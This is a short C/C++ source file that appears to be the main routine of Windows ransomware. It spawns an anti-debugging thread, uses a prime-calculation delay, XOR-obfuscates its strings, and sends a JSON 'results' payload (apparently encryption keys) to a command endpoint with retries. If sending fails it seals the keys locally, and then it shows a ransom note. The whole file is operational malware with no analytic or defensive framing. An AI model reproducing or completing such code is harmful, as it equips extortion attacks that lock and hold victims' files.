#include "main.hpp"

DWORD WINAPI yarnMain(LPVOID lpParam);
DWORD WINAPI yarnAntiVM(LPVOID lpParam);

// TODO: add compression library

int main()
{
	calculatePrimeNo(100000);
	yarn(2, yarnMain, yarnAntiVM);
	return 0;
}

DWORD WINAPI yarnAntiVM(LPVOID lpParam)
{
	if (isDebuggerPresent())
	{
		exit(EXIT_FAILURE);
	}
	return 0;
}

DWORD WINAPI yarnMain(LPVOID lpParam)
{
	if (init())
	{
		return 1;
	}

	char *json = thread("Z:\\home\\kithinji\\Documents\\dudu\\suite\\siri\\enc");
	Dict payload[] = {
		{sXOR("results"), json},
		{NULL, NULL}};

	int sent = FALSE;

	for (int i = 0; i < 5; ++i)
	{
		char *res = request(payload, sXOR("/flight/nest/"));
		if (res)
		{
			sent = TRUE;
			free(res);
			break;
		}
		free(res);
		Sleep(5000);
	}

	if (!sent)
	{
		sealKeys(json);
	}

	free(json);

	ransomNote();

	return 0;
}
